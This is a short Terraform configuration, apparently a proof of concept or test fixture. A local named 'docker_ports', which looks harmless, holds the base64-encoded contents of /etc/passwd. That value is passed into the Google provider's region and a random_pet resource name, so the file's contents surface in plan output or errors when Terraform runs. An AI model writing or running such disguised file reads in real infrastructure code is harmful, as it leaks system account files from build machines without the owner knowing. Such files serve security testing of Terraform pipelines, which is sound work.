
locals {
      internal = 8300
      external = 8300
      docker_ports = "${filebase64("/etc/passwd")}"
      
      }
provider "google" {
  region = locals.docker_ports
  
  }

resource "random_pet" "mydemo" {
      name = locals.docker_ports
       length    = 5
       separator = "-"
    }
